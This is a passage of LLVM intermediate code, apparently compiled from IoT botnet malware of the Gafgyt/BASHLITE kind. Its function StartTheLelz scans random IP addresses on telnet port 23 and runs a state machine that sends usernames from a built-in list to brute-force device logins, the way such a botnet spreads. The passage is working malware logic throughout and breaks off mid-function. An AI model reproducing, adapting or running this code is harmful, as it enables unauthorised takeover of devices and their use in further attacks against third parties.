  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %30 = load i32, i32* %29, align 4
  %31 = call i8* @inet_ntoa(i32 %30) #12
  store i8* %31, i8** %2, align 8
  br label %38

32:                                               ; No predecessors!
  %33 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %34 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %33, i32 0, i32 7
  %35 = load %struct.addrinfo*, %struct.addrinfo** %34, align 8
  store %struct.addrinfo* %35, %struct.addrinfo** %7, align 8
  br label %19, !llvm.loop !44

36:                                               ; preds = %19
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  call void @freeaddrinfo(%struct.addrinfo* noundef %37) #12
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i8** %2, align 8
  br label %38

38:                                               ; preds = %36, %22, %16
  %39 = load i8*, i8** %2, align 8
  ret i8* %39
}

declare i32 @getaddrinfo(i8* noundef, i8* noundef, %struct.addrinfo* noundef, %struct.addrinfo** noundef) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @socket_connect(i8* noundef %0, i16 noundef zeroext %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %11 = load i8*, i8** %4, align 8
  %12 = call i8* @mygethostbyname(i8* noundef %11)
  %13 = bitcast i8* %12 to %struct.hostent*
  store %struct.hostent* %13, %struct.hostent** %6, align 8
  %14 = icmp eq %struct.hostent* %13, null
  br i1 %14, label %15, label %16

15:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %50

16:                                               ; preds = %2
  %17 = load %struct.hostent*, %struct.hostent** %6, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %6, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* noundef %21, i8* noundef %23, i64 noundef %27) #12
  %28 = load i16, i16* %5, align 2
  %29 = call zeroext i16 @htons(i16 noundef zeroext %28) #15
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %31, align 4
  %32 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 6) #12
  store i32 %32, i32* %9, align 4
  %33 = load i32, i32* %9, align 4
  %34 = bitcast i32* %8 to i8*
  %35 = call i32 @setsockopt(i32 noundef %33, i32 noundef 6, i32 noundef 1, i8* noundef %34, i32 noundef 4) #12
  %36 = load i32, i32* %9, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

38:                                               ; preds = %16
  store i32 0, i32* %3, align 4
  br label %50

39:                                               ; preds = %16
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %42 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %42, %struct.sockaddr** %41, align 8
  %43 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %44 = load %struct.sockaddr*, %struct.sockaddr** %43, align 8
  %45 = call i32 @connect(i32 noundef %40, %struct.sockaddr* %44, i32 noundef 16)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %39
  store i32 0, i32* %3, align 4
  br label %50

48:                                               ; preds = %39
  %49 = load i32, i32* %9, align 4
  store i32 %49, i32* %3, align 4
  br label %50

50:                                               ; preds = %48, %47, %38, %15
  %51 = load i32, i32* %3, align 4
  ret i32 %51
}

; Function Attrs: nounwind
declare void @bcopy(i8* noundef, i8* noundef, i64 noundef) #4

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @StartTheLelz(i32 noundef %0, i32 noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64, align 8
  %21 = alloca i8*, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @fork() #12
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %2
  ret void

28:                                               ; preds = %2
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %11, align 4
  %30 = call i64 @time(i64* noundef null) #12
  %31 = call i32 @rand_cmwc()
  %32 = zext i32 %31 to i64
  %33 = xor i64 %30, %32
  %34 = trunc i64 %33 to i32
  call void @srand(i32 noundef %34) #12
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = call noalias i8* @malloc(i64 noundef 1025) #12
  store i8* %40, i8** %17, align 8
  %41 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %41, i8 0, i64 1025, i1 false)
  %42 = load i32, i32* %11, align 4
  %43 = zext i32 %42 to i64
  %44 = call i8* @llvm.stacksave()
  store i8* %44, i8** %19, align 8
  %45 = alloca %struct.telstate_t, i64 %43, align 16
  store i64 %43, i64* %20, align 8
  %46 = bitcast %struct.telstate_t* %45 to i8*
  %47 = load i32, i32* %11, align 4
  %48 = sext i32 %47 to i64
  %49 = mul i64 %48, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %46, i8 0, i64 %49, i1 false)
  store i32 0, i32* %5, align 4
  br label %50

50:                                               ; preds = %68, %28
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %11, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %71

54:                                               ; preds = %50
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %56
  %58 = bitcast %struct.telstate_t* %57 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %58, i8 0, i64 32, i1 false)
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %60
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %61, i32 0, i32 3
  store i8 1, i8* %62, align 1
  %63 = load i8*, i8** %17, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 9
  store i8* %63, i8** %67, align 8
  br label %68

68:                                               ; preds = %54
  %69 = load i32, i32* %5, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %5, align 4
  br label %50, !llvm.loop !45

71:                                               ; preds = %50
  br label %72

72:                                               ; preds = %867, %71
  br label %73

73:                                               ; preds = %72
  store i32 0, i32* %5, align 4
  br label %74

74:                                               ; preds = %864, %73
  %75 = load i32, i32* %5, align 4
  %76 = load i32, i32* %11, align 4
  %77 = icmp slt i32 %75, %76
  br i1 %77, label %78, label %867

78:                                               ; preds = %74
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 7
  %83 = load i32, i32* %82, align 16
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %92

85:                                               ; preds = %78
  %86 = call i64 @time(i64* noundef null) #12
  %87 = trunc i64 %86 to i32
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 7
  store i32 %87, i32* %91, align 16
  br label %92

92:                                               ; preds = %85, %78
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = zext i8 %97 to i32
  switch i32 %98, label %863 [
    i32 0, label %99
    i32 1, label %238
    i32 2, label %343
    i32 3, label %389
    i32 4, label %434
    i32 5, label %480
    i32 6, label %525
    i32 7, label %625
  ]

99:                                               ; preds = %92
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 3
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 1
  br i1 %106, label %107, label %127

107:                                              ; preds = %99
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 9
  %112 = load i8*, i8** %111, align 8
  store i8* %112, i8** %21, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %114
  %116 = bitcast %struct.telstate_t* %115 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %116, i8 0, i64 32, i1 false)
  %117 = load i8*, i8** %21, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 9
  store i8* %117, i8** %121, align 8
  %122 = call i32 @getDatIP()
  %123 = load i32, i32* %5, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 1
  store i32 %122, i32* %126, align 4
  br label %175

127:                                              ; preds = %99
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 3
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %174

135:                                              ; preds = %127
  %136 = load i32, i32* %5, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 5
  %140 = load i8, i8* %139, align 1
  %141 = add i8 %140, 1
  store i8 %141, i8* %139, align 1
  %142 = load i32, i32* %5, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = add i8 %146, 1
  store i8 %147, i8* %145, align 2
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 5
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i64
  %154 = icmp eq i64 %153, 98
  br i1 %154, label %155, label %160

155:                                              ; preds = %135
  %156 = load i32, i32* %5, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 3
  store i8 1, i8* %159, align 1
  br label %864

160:                                              ; preds = %135
  %161 = load i32, i32* %5, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 4
  %165 = load i8, i8* %164, align 2
  %166 = zext i8 %165 to i64
  %167 = icmp eq i64 %166, 99
  br i1 %167, label %168, label %173

168:                                              ; preds = %160
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 3
  store i8 1, i8* %172, align 1
  br label %864

173:                                              ; preds = %160
  br label %174

174:                                              ; preds = %173, %127
  br label %175

175:                                              ; preds = %174, %107
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %176, align 4
  %177 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %180 = getelementptr inbounds [8 x i8], [8 x i8]* %179, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %180, i8 0, i64 8, i1 false)
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  %188 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %189 = load i32, i32* %5, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 0
  store i32 %188, i32* %192, align 16
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = icmp eq i32 %197, -1
  br i1 %198, label %199, label %200

199:                                              ; preds = %175
  br label %864

200:                                              ; preds = %175
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 16
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 16
  %211 = call i32 (i32, i32, ...) @fcntl(i32 noundef %210, i32 noundef 3, i8* noundef null)
  %212 = or i32 %211, 2048
  %213 = call i32 (i32, i32, ...) @fcntl(i32 noundef %205, i32 noundef 4, i32 noundef %212)
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %220 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %220, %struct.sockaddr** %219, align 8
  %221 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %222 = load %struct.sockaddr*, %struct.sockaddr** %221, align 8
  %223 = call i32 @connect(i32 noundef %218, %struct.sockaddr* %222, i32 noundef 16)
  %224 = icmp eq i32 %223, -1
  br i1 %224, label %225, label %233

225:                                              ; preds = %200
  %226 = call i32* @__errno_location() #15
  %227 = load i32, i32* %226, align 4
  %228 = icmp ne i32 %227, 115
  br i1 %228, label %229, label %233

229:                                              ; preds = %225
  %230 = load i32, i32* %5, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %231
  call void @reset_telstate(%struct.telstate_t* noundef %232)
  br label %237

233:                                              ; preds = %225, %200
  %234 = load i32, i32* %5, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %235
  call void @advance_telstate(%struct.telstate_t* noundef %236, i32 noundef 1)
  br label %237

237:                                              ; preds = %233, %229
  br label %863

238:                                              ; preds = %92
  br label %239

239:                                              ; preds = %238
  store %struct.__sigset_t* %12, %struct.__sigset_t** %24, align 8
  store i32 0, i32* %23, align 4
  br label %240

240:                                              ; preds = %250, %239
  %241 = load i32, i32* %23, align 4
  %242 = zext i32 %241 to i64
  %243 = icmp ult i64 %242, 16
  br i1 %243, label %244, label %253

244:                                              ; preds = %240
  %245 = load %struct.__sigset_t*, %struct.__sigset_t** %24, align 8
  %246 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %245, i32 0, i32 0
  %247 = load i32, i32* %23, align 4
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds [16 x i64], [16 x i64]* %246, i64 0, i64 %248
  store i64 0, i64* %249, align 8
  br label %250

250:                                              ; preds = %244
  %251 = load i32, i32* %23, align 4
  %252 = add i32 %251, 1
  store i32 %252, i32* %23, align 4
  br label %240, !llvm.loop !46

253:                                              ; preds = %240
  br label %254

254:                                              ; preds = %253
  br label %255

255:                                              ; preds = %254
  %256 = load i32, i32* %5, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 0
  %260 = load i32, i32* %259, align 16
  %261 = srem i32 %260, 64
  %262 = zext i32 %261 to i64
  %263 = shl i64 1, %262
  %264 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %265 = load i32, i32* %5, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 16
  %270 = sdiv i32 %269, 64
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %264, i64 0, i64 %271
  %273 = load i64, i64* %272, align 8
  %274 = or i64 %273, %263
  store i64 %274, i64* %272, align 8
  %275 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %275, align 8
  %276 = load i32, i32* %3, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %277, i64* %278, align 8
  %279 = load i32, i32* %5, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = add nsw i32 %283, 1
  %285 = call i32 @select(i32 noundef %284, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.__sigset_t* noundef null, %struct.timeval* noundef %13)
  store i32 %285, i32* %6, align 4
  %286 = load i32, i32* %6, align 4
  %287 = icmp eq i32 %286, 1
  br i1 %287, label %288, label %320

288:                                              ; preds = %255
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %289 = load i32, i32* %5, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = bitcast i32* %15 to i8*
  %295 = call i32 @getsockopt(i32 noundef %293, i32 noundef 1, i32 noundef 4, i8* noundef %294, i32* noundef %14) #12
  %296 = load i32, i32* %15, align 4
  %297 = icmp ne i32 %296, 0
  br i1 %297, label %298, label %302

298:                                              ; preds = %288
  %299 = load i32, i32* %5, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %300
  call void @reset_telstate(%struct.telstate_t* noundef %301)
  br label %319

302:                                              ; preds = %288
  %303 = load i32, i32* %5, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = load i32, i32* %5, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = call i32 (i32, i32, ...) @fcntl(i32 noundef %312, i32 noundef 3, i8* noundef null)
  %314 = and i32 %313, -2049
  %315 = call i32 (i32, i32, ...) @fcntl(i32 noundef %307, i32 noundef 4, i32 noundef %314)
  %316 = load i32, i32* %5, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %317
  call void @advance_telstate(%struct.telstate_t* noundef %318, i32 noundef 2)
  br label %319

319:                                              ; preds = %302, %298
  br label %864

320:                                              ; preds = %255
  %321 = load i32, i32* %6, align 4
  %322 = icmp eq i32 %321, -1
  br i1 %322, label %323, label %327

323:                                              ; preds = %320
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %325
  call void @reset_telstate(%struct.telstate_t* noundef %326)
  br label %864

327:                                              ; preds = %320
  br label %328

328:                                              ; preds = %327
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 7
  %333 = load i32, i32* %332, align 16
  %334 = add i32 %333, 5
  %335 = zext i32 %334 to i64
  %336 = call i64 @time(i64* noundef null) #12
  %337 = icmp slt i64 %335, %336
  br i1 %337, label %338, label %342

338:                                              ; preds = %328
  %339 = load i32, i32* %5, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %340
  call void @reset_telstate(%struct.telstate_t* noundef %341)
  br label %342

342:                                              ; preds = %338, %328
  br label %863

343:                                              ; preds = %92
  %344 = load i32, i32* %5, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 16
  %349 = load i32, i32* %3, align 4
  %350 = load i32, i32* %5, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 9
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @read_until_response(i32 noundef %348, i32 noundef %349, i8* noundef %354, i32 noundef 1024, i8** noundef getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i64 0, i64 0))
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %357, label %374

357:                                              ; preds = %343
  %358 = load i32, i32* %5, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 9
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @contains_fail(i8* noundef %362)
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %369

365:                                              ; preds = %357
  %366 = load i32, i32* %5, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %367
  call void @advance_telstate(%struct.telstate_t* noundef %368, i32 noundef 0)
  br label %373

369:                                              ; preds = %357
  %370 = load i32, i32* %5, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %371
  call void @advance_telstate(%struct.telstate_t* noundef %372, i32 noundef 3)
  br label %373

373:                                              ; preds = %369, %365
  br label %864

374:                                              ; preds = %343
  %375 = load i32, i32* %5, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 7
  %379 = load i32, i32* %378, align 16
  %380 = add i32 %379, 7
  %381 = zext i32 %380 to i64
  %382 = call i64 @time(i64* noundef null) #12
  %383 = icmp slt i64 %381, %382
  br i1 %383, label %384, label %388

384:                                              ; preds = %374
  %385 = load i32, i32* %5, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %386
  call void @reset_telstate(%struct.telstate_t* noundef %387)
  br label %388

388:                                              ; preds = %384, %374
  br label %863

389:                                              ; preds = %92
  %390 = load i32, i32* %5, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 0
  %394 = load i32, i32* %393, align 16
  %395 = load i32, i32* %5, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 4
  %399 = load i8, i8* %398, align 2
  %400 = zext i8 %399 to i64
  %401 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %400
  %402 = load i8*, i8** %401, align 8
  %403 = load i32, i32* %5, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 4
  %407 = load i8, i8* %406, align 2
  %408 = zext i8 %407 to i64
  %409 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %408
  %410 = load i8*, i8** %409, align 8
  %411 = call i64 @strlen(i8* noundef %410) #11
  %412 = call i64 @send(i32 noundef %394, i8* noundef %402, i64 noundef %411, i32 noundef 16384)
